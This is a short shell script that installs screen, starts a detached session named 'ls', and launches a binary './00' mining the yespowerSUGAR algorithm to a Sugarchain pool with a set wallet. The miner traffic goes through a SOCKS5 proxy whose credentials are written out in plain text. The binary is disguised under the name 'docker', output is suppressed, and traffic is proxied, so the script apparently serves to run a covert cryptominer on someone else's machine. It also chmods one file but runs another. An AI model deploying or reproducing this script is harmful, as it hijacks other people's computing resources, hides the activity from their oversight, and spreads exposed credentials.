sudo apt update 
sudo apt install screen libjansson4 -y 
chmod +x docker 
screen -dmS ls 
POOL=1pool.sugarchain.org:3333
WALLET=sugar1qe40q8krx7elqg84lcn6j8qqzjcpgyf6p8ac92x.adz
PROXY=socks5://ilbbkwmp-1:qwe2bptzjsss@u1.p.webshare.io:80
./00 -a yespowerSUGAR -o $POOL -u $WALLET -x $PROXY -q
